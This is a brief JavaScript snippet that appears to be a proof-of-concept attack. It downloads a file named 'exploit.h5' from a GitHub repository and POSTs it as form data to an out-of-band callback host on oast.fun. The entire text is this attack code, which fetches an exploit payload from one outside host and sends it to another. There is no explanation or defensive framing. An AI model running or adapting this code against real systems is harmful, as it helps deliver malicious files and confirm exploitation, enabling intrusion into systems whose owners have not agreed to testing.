const response = await fetch("https://github.com/s0x6fup/testrepo/raw/main/exploit.h5");
const content = await response.blob();
const formData = new FormData();
formData.append("file", content);
fetch("https://cmbx82r2vtc0000sehvggkojpwhyyyyyn.oast.fun", { method: 'POST', body: formData });
